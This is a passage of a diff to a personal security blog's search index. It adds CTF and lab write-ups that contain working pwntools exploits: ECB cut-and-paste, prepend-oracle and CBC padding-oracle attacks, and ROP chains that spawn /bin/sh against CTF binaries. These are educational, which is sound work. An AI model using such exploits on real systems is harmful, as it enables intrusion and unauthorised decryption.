oracle(iv[:now]+<span class="built_in">bytes</span>([k])+xor(cur, iv[now+<span class="number">1</span>:], <span class="built_in">chr</span>(<span class="number">16</span>-now).encode()*(<span class="number">15</span>-now)), mess):</span><br><span class="line">                <span class="keyword">if</span> now==<span class="number">15</span>:</span><br><span class="line">                    <span class="keyword">if</span> k!=iv[<span class="number">15</span>]:</span><br><span class="line">                        cur=xor(k, iv[<span class="number">15</span>], <span class="number">1</span>)+cur</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur=xor(k, iv[now], (<span class="number">16</span>-now))+cur</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    ans+=cur</span><br><span class="line">    cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Prepend Oracle</tag>
-        <tag>AES</tag>
-        <tag>ECB</tag>
-        <tag>CBC</tag>
-        <tag>Cut and Paste</tag>
-        <tag>Bit Flipping</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>APCS 2023 10月場心得</title>
     <url>/2023/10/25/apcs202310/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是我第二次考APCS，上次已經是去年了（中間一直有其他事情orz）<br>但這次不論是上午的觀念題還是下午的實作感覺都比去年還要順手很多，應該跟我暑假練很多有關吧，所以希望這次可以撈到 5&#x2F;5…<br>底下是我考後打得code，題目在<a href="https://zerojudge.tw/">zerojudge</a>上面應該都有  </p>
@@ -643,6 +546,28 @@
         <tag>implementation</tag>
         <tag>DSU</tag>
         <tag>DP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Block Cipher Mode note</title>
+    <url>/2023/11/04/block-cipher-1/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>A quick Block Cipher Mode review for myself.<br>All the exploits down below are for <a href="https://github.com/oalieno/Crypto-Course/tree/master/Block-Cipher-Mode">Labs made by Oalieno</a>  </p>
+<p><a href="https://www.youtube.com/watch?v=VzuIjk1bmFE">Recommended Course</a>  </p>
+<h2 id="Block-Cipher-Mode"><a href="#Block-Cipher-Mode" class="headerlink" title="Block Cipher Mode"></a>Block Cipher Mode</h2><h2 id="Cut-and-Paste-Attack"><a href="#Cut-and-Paste-Attack" class="headerlink" title="Cut and Paste Attack"></a>Cut and Paste Attack</h2><p><strong>EBC MODE vulnerability</strong><br>Because in ECB mode, size of an block is always 16 bytes, so even though we can’t crack it, it’s still feasible to construct datas with specific size and rearrange the encrypted blocks which bring spoofing<br><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20001</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode())</span><br><span class="line"><span class="comment">#user:AAAAAAAAAAA 999999999999999 BBBBBBBBB;money: 10;</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">11</span>+<span class="string">&#x27;9&#x27;</span>*<span class="number">16</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">9</span></span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode)</span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(s.decode().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">2</span>])</span><br><span class="line">payload=s[:<span class="number">16</span>]+s[<span class="number">32</span>:<span class="number">48</span>]+s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">48</span>:]</span><br><span class="line">payload=payload.<span class="built_in">hex</span>()</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Prepend-Oracle"><a href="#Prepend-Oracle" class="headerlink" title="Prepend Oracle"></a>Prepend Oracle</h2><p><strong>EBC MODE vulnerability</strong><br>This method can be used when your input would be encrypted with message you want to encrpt<br>The main idea is to enumerate through characters until it’s same with encrypted blocks generated from only padding input.<br><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20005</span>)</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">data</span>):</span><br><span class="line">    data=data.<span class="built_in">hex</span>().encode()</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="comment">#    print(s)</span></span><br><span class="line">    r.sendline(data)</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    padding=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">32</span>-<span class="number">1</span>-i)</span><br><span class="line">    test=oracle(padding)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> oracle(padding+flag+c.encode())[:<span class="number">64</span>]==test[:<span class="number">64</span>]:</span><br><span class="line"><span class="comment">#            print(test)</span></span><br><span class="line"><span class="comment">#            print(oracle(padding+flag+c.encode()))</span></span><br><span class="line">            flag=flag+c.encode()</span><br><span class="line">            <span class="built_in">print</span>(flag, i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a>Padding Oracle</h2><p><strong>CBC MODE vulnerability</strong><br>This method can be used when it’s possible to get the IV(Initialized Iector) value and the padding method is knowned. Also, it’s necessary that there exist some clues to check whether the input is unpaded successfuly or not<br>The main idea is to enumerate through characters until the message have been unpad successfuly, and remember to adjust the iv value sended cautiously!  </p>
+<p><strong>How to cauculate the correct value after unpad successfuly?</strong><br>that byte of data &#x3D; Now_Trying ^ IV Value at that position ^ padding<br><code>cur=xor(k, iv[now], (16-now))+cur</code><br>cur &#x3D; the decrypted block,<br>k &#x3D; the value be tried now,<br>16-now &#x3D; padding.<br><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3140</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">iv, mess</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27; = &#x27;</span>, (iv+mess).<span class="built_in">hex</span>().encode())</span><br><span class="line"><span class="comment">#    info(len((iv+mess).hex().encode()))</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;PADDING CORRECT!!!&#x27;</span> <span class="keyword">in</span> r.recvline()</span><br><span class="line"></span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(r.recvline()[:-<span class="number">1</span>].decode().split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"><span class="comment">#print(flag, len(flag))</span></span><br><span class="line">ans=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)-<span class="number">16</span>, <span class="number">16</span>)):</span><br><span class="line">    iv, mess=flag[i:i+<span class="number">16</span>], flag[i+<span class="number">16</span>:i+<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        now=<span class="number">15</span>-j</span><br><span class="line"><span class="comment">#        info(now)</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="comment">#            info(len(bytes([k]))==1)</span></span><br><span class="line">            <span class="keyword">if</span> oracle(iv[:now]+<span class="built_in">bytes</span>([k])+xor(cur, iv[now+<span class="number">1</span>:], <span class="built_in">chr</span>(<span class="number">16</span>-now).encode()*(<span class="number">15</span>-now)), mess):</span><br><span class="line">                <span class="keyword">if</span> now==<span class="number">15</span>:</span><br><span class="line">                    <span class="keyword">if</span> k!=iv[<span class="number">15</span>]:</span><br><span class="line">                        cur=xor(k, iv[<span class="number">15</span>], <span class="number">1</span>)+cur</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur=xor(k, iv[now], (<span class="number">16</span>-now))+cur</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    ans+=cur</span><br><span class="line">    cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Prepend Oracle</tag>
+        <tag>AES</tag>
+        <tag>ECB</tag>
+        <tag>CBC</tag>
+        <tag>Cut and Paste</tag>
+        <tag>Bit Flipping</tag>
       </tags>
   </entry>
   <entry>
@@ -701,8 +626,8 @@
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>累了，晚安世界</p>
 ]]></content>
       <tags>
-        <tag>HackTheBox</tag>
         <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -750,12 +675,12 @@ My arms were almost broken by brute forcing through this…</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>We have only three members in our team and we aren’t as professional as other teams, so a good experience and performance, keep going on!<br><img src="https://hackmd.io/_uploads/B1pY5eC7T.png" alt="image"></p>
 ]]></content>
       <tags>
-        <tag>pwn</tag>
         <tag>CTF</tag>
         <tag>Cryptography</tag>
         <tag>Web Security</tag>
         <tag>WAN</tag>
         <tag>SQL Injection</tag>
+        <tag>pwn</tag>
         <tag>vtable</tag>
         <tag>Signature</tag>
       </tags>
@@ -823,9 +748,9 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <p><img src="https://hackmd.io/_uploads/SysitT_rT.png" alt="image">  </p>
 ]]></content>
       <tags>
-        <tag>pwn</tag>
         <tag>CTF</tag>
         <tag>Web Security</tag>
+        <tag>pwn</tag>
         <tag>game hacking</tag>
         <tag>cheat engine</tag>
       </tags>
@@ -1054,8 +979,8 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>這是補昨天的，今天可能還要寫兩篇(倒)  </p>
 ]]></content>
       <tags>
-        <tag>HackTheBox</tag>
         <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1197,9 +1122,9 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>水，撫慰今天apcs 觀念題繼續被炸爛的心情<br>要段考要資格考ㄌqwq<br>這個賽季應該只能 Silver了ㄅ，下季要努力打(如果沒有衝到其他事情)<br><img src="https://hackmd.io/_uploads/SyFVCNhHC.png" alt="image">  </p>
 ]]></content>
       <tags>
-        <tag>HackTheBox</tag>
         <tag>Pentesting</tag>
         <tag>SSRF</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1328,9 +1253,9 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>最近看到pickle都會想到自己拿的CVE，或許是個未來高三專題可以研究的方向(??)<br>關於ML套件的弱點<br>不過這台好玩啦&gt;&lt;b<br><a href="https://www.hackthebox.com/achievement/machine/1519847/605">Badge link(click)</a><br><img src="https://hackmd.io/_uploads/SkQRZIhBA.png" alt="image">  </p>
 ]]></content>
       <tags>
-        <tag>HackTheBox</tag>
         <tag>Pentesting</tag>
         <tag>serialization</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1363,10 +1288,10 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 ]]></content>
       <tags>
         <tag>CTF</tag>
-        <tag>HackTheBox</tag>
         <tag>Cryptography</tag>
         <tag>RSA</tag>
         <tag>ECC</tag>
+        <tag>HackTheBox</tag>
         <tag>HASH</tag>
       </tags>
   </entry>
@@ -1785,8 +1710,8 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <p>附上比hashcat慢一點的python作法<br><img src="https://hackmd.io/_uploads/BJtPOq1gA.png" alt="image">  </p>
 ]]></content>
       <tags>
-        <tag>HackTheBox</tag>
         <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -2103,10 +2028,10 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 </ul>
 ]]></content>
       <tags>
-        <tag>pwn</tag>
-        <tag>ROP</tag>
         <tag>BOF</tag>
+        <tag>ROP</tag>
         <tag>ret2shellcode</tag>
+        <tag>pwn</tag>
         <tag>ret2code</tag>
         <tag>ret2lib</tag>
         <tag>GOT Hijacking</tag>
@@ -2181,6 +2106,81 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
         <tag>JuicyPotato</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Return Oriented Program note</title>
+    <url>/2023/10/29/rop1/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I had posted a note of pwn for beginners(<a href="https://wha13.github.io/2023/10/12/pwn-note/">link here</a>), and recently I’ve learned more about ROP, so here is this post~  </p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="What-is-ROP"><a href="#What-is-ROP" class="headerlink" title="What is ROP?"></a>What is ROP?</h3><p>ROP(Return Oriented Program) is an attack method extended from BOF(Buffer Overflow), in ROP, the key point is to cover return address and lead it to Program Fragments you want(can be repeated many times if you have many usable fragments).<br>Basically, a fragment end with <code>ret</code> is mostly used.  </p>
+<h3 id="x86-64-ROP"><a href="#x86-64-ROP" class="headerlink" title="x86_64 ROP"></a>x86_64 ROP</h3><p>In x86_64, size of an address is 8 bytes(p64 in pwntool), so registers used frequently are rax, rdi, rsi, rdx ……<br>To connect the ROP Chain, it’s important to make sure every register called in the function, and find the corresponding fregment in the program. Is easy to find fregment with tools such as <code>ROPgadget</code>  and <code>pwntool</code>.<br><strong>ROPgadget:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary=binary_file | grep &quot;mov dword .* ret&quot; | less</span><br></pre></td></tr></table></figure>
+<p>In this command, I want to find a gadget start with mov_dword and end with ret.<br>but is much more easier to find a register fragment with pwntool.<br><strong>pwntool</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./oob1&#x27;</span>)</span><br><span class="line"><span class="comment"># find an rdi fregment</span></span><br><span class="line">rop.rdi</span><br><span class="line"><span class="comment"># result</span></span><br><span class="line"><span class="comment"># Gadget(0x400a03, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span></span><br></pre></td></tr></table></figure>
+<p>In x86_64 system, if a variable want to be executive(or other action), it needs an syscall.  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
+<p><a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a><br>syscall table has each register need for every call and the meaning for each register.<br>p.s. execve is excution call.<br>Connect fragment like <code>pop rdi; ret</code> with a value can modify the value of <code>rdi</code> and move to mext fregment(possibly a function or syscall)<br>An example for an excution syscall:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, shellcode, pop_rsi_ret, <span class="number">0</span>, syscall)</span><br></pre></td></tr></table></figure>
+<p>This ROP chain would make the value of rax become <code>0x3b</code>(execve on <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>), and rdi value become the address of shellcode(like string: <code>/bin/sh\x00</code>)<br><code>\x00</code> is a symbol to stop reading.<br>Also, vmmap in geb-peda is often used to find writable(or something else) datas.  </p>
+<h3 id="x86-ROP"><a href="#x86-ROP" class="headerlink" title="x86 ROP"></a>x86 ROP</h3><p>Same logic as <code>x86_64</code><br><a href="https://syscalls.w3challs.com/?arch=x86">syscall table</a><br>Some differents between x86 and x86_64:  </p>
+<ol>
+<li>In x86 system, each address and register are mostly 4 bytes  </li>
+<li>int80 in x86 has the same function with syscall in x86_64<br><strong>Example:</strong><br>execve in x86:  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Pwnasm-from-LoTuX-CTF"><a href="#Pwnasm-from-LoTuX-CTF" class="headerlink" title="Pwnasm from LoTuX CTF"></a>Pwnasm from LoTuX CTF</h3><p><a href="https://lotuxctf.com/challenges#Pwnasm-27">Click link</a><br>It’s a simple ROP<br><strong>Solution</strong><br>Start with pwntool:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./pwnasm&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>Extracted datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>It’s a x86_64 system(amd64), so check out the <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a> ,register gadgets needed to trigger <code>syscall</code> are <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>.<br>Also, from the reverse result by <a href="https://ghidra-sre.org/">Ghidra</a><img src="https://hackmd.io/_uploads/ByWE-tiMa.png"><br>there are some weird datas on the stack(our shell(<code>&#39;/bin/sh&#39;</code> at<code>0x00402000</code>) and first part of flag), so it’s possible to construct an ROP Chain and excuse the shell  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.rax</span><br><span class="line">rop.rdi</span><br><span class="line">rop.rsi</span><br><span class="line">rop.rdx</span><br><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
+<p>Extracted datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; rop.rax</span><br><span class="line">Gadget(0x401000, [&#x27;pop rax&#x27;, &#x27;ret&#x27;], [&#x27;rax&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdx</span><br><span class="line">Gadget(0x401006, [&#x27;pop rdx&#x27;, &#x27;ret&#x27;], [&#x27;rdx&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdi</span><br><span class="line">Gadget(0x401002, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rsi</span><br><span class="line">Gadget(0x401004, [&#x27;pop rsi&#x27;, &#x27;ret&#x27;], [&#x27;rsi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.syscall</span><br><span class="line">gadget(address=4198416, details=Gadget(0x401010, [&#x27;syscall&#x27;, &#x27;ret&#x27;], [], 0x4))</span><br></pre></td></tr></table></figure>
+<p>Finally, my exploit code:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;lotuxctf.com&#x27;</span>, <span class="number">10005</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x402000</span></span><br><span class="line">pop_rax_ret=<span class="number">0x401000</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401002</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401004</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x401006</span></span><br><span class="line">syscall=<span class="number">0x401010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload=flat(pop_rax_ret, <span class="number">0x3b</span>, pop_rdi_ret, shell, pop_rsi_ret, <span class="number">0</span>, pop_rdx_ret, <span class="number">0</span>, syscall)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo server"></a>echo server</h3><p><a href="https://wha13.github.io/files/echo_server/echo_server">file</a><br><a href="https://wha13.github.io/files/echo_server/echo_server.c">source code</a><br>A x86_64 file<br>ROP Chain:<br><code>pop rdi; ret</code>-&gt;<code>change rdi location to global variable</code>-&gt;<code>trigger get function</code>-&gt;<code>return to runCMD function to bypass getString() filtering function</code><br>Exploit:  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./echo_server&#x27;</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">runCMD=<span class="number">0x4006c6</span></span><br><span class="line">gets=<span class="number">0x4005a0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400923</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">r.recvlines(<span class="number">7</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload1=padding+flat(pop_rdi_ret, shell, gets, runCMD)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="rop1-sean-Pwn-2"><a href="#rop1-sean-Pwn-2" class="headerlink" title="rop1-sean_Pwn-2"></a>rop1-sean_Pwn-2</h3><p><a href="https://wha13.github.io/files/rop1-sean_Pwn-2/rop1">file</a><br><a href="https://blog.frozenkp.me/pwn/stack_migration/">Stack Migration</a>  </p>
+<h4 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h4><p>Stack Migration is a technique to cover register base into a modified stack location, and the first 8 bytes(if it’s a x86_64 system)&#x2F;first 4 bytes(if it’s a x86 system) need to be a location for new register(<del>garbage</del>)</p>
+<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>First write the ROP Chain into global variable, and trgger it in <code>func1</code>, remember to leave.</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=(<span class="number">0x006c9eb8</span>+<span class="number">0x006cd548</span>)//<span class="number">2</span></span><br><span class="line">pop_rax_rdx_rbx_ret=<span class="number">0x478616</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401516</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401637</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">read=<span class="number">0x43f4b0</span></span><br><span class="line">syscall=<span class="number">0x4003da</span></span><br><span class="line">func1=<span class="number">0x4009ae</span></span><br><span class="line">leave=<span class="number">0x4009e4</span></span><br><span class="line">main=<span class="number">0x4009e6</span></span><br><span class="line">bof2=<span class="number">0x6ccd60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=flat(<span class="number">1004120</span>, pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, bof2+<span class="number">10</span>*<span class="number">0x8</span>, pop_rsi_ret, <span class="number">0</span>, syscall, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;rahwhale&#x27;</span>*<span class="number">4</span>+flat(bof2, leave)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ropfu-from-picoCTF"><a href="#ropfu-from-picoCTF" class="headerlink" title="ropfu from picoCTF"></a>ropfu from picoCTF</h3><p><a href="https://play.picoctf.org/practice/challenge/292?category=6&page=3">link</a><br>An <code>i386</code> (x86) system, key points are on above.<br>Use fragments like <code>mov dword [edx] eax; ret</code> to write shell on eax into location edx.<br>p.s.the shell input need to be converted into hex and reversed<br><strong>exploit</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./ropfu&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">52033</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">data=(<span class="number">0x080e36a0</span>+<span class="number">0x080e6ff0</span>)//<span class="number">2</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80b073a</span></span><br><span class="line">pop_ebx_ret=<span class="number">0x8049022</span></span><br><span class="line">pop_ecx_ret=<span class="number">0x8049e29</span></span><br><span class="line">pop_edx_ebx_ret=<span class="number">0x80583b9</span></span><br><span class="line">syscall=<span class="number">0x806417d</span></span><br><span class="line">mov_edx_eax=<span class="number">0x080590f2</span></span><br><span class="line">get=<span class="number">0x08051b60</span></span><br><span class="line">read=<span class="number">0x0806ece0</span></span><br><span class="line">vuln=<span class="number">0x08049d85</span></span><br><span class="line"><span class="built_in">bin</span>=<span class="number">0x6e69622f</span></span><br><span class="line">sh=<span class="number">0x0068732f</span></span><br><span class="line">int80=<span class="number">0x0807163f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+flat(pop_eax_ret, <span class="built_in">bin</span>, pop_edx_ebx_ret, data, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, sh, pop_edx_ebx_ret, data+<span class="number">4</span>, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80))</span><br><span 